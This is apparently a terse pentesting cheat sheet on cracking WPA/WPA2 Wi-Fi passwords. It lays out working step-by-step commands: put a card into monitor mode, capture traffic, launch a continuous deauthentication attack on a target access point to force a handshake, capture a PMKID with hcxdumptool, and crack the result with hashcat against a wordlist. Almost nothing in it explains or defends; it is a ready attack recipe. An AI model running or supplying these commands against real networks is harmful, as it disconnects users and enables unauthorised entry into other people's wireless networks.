# WPA/WPA2 PSK Auth

You need to capture a 4-way WPA/WPA2 auth handshake, likely using a deauth attack. You will need to install `airmon-ng`, `airodump-ng`, and `aireplay-ng`.

First off create a monitoring interface for wlan0:

* `airmon-ng start wlan0`

Second capture packets to file from channel 11

* `airodump-ng mon0 --write capture.pcap -c 11`

Third deauth attack against BSSID bb:bb:bb:bb:bb:bb

* `aireplay-ng --deauth 0 -a bb:bb:bb:bb:bb:bb mon0`

Fourth: wait some time

Fifth: convert hashes, you should use `baking.sh`


# WPA2 PKMID 

Doesn't require you to capture the 4-way handshake, you will want to download the following:

* https://github.com/ZerBea/hcxtools.git
* https://github.com/ZerBea/hcxdumptool


First start listening for broadcasting access points ot locate the BSSID you want to target

* `airodump-ng <interface>`

Second place target BSSID into a fil, and start hcxdumptool to capture the PKMID

* `hcxdumptool -i <interface> --filterlist_ap=bssid_file.txt --filtermode=2 --enable_status=2 -o pmkid.pcap`

Third with the BSSID PKMID captured, extract into hashcat format for cracking

* `hcxpcaptool -z wpa2_pmkid_hash.txt pmkid.pcap`

Fourth start flicking your wrists

* `hashcat -a 0 -m 16800 -w 4 wpa2_pmkid_hash.txt dict.txt`

# Filtration

You can run the following against hccapx files to get a list of associated ESSIDs:

```shell
$>  hcxhashtool -i combined.hccapx -E combined.hccapx.essid_list -o combined.hccapx2
```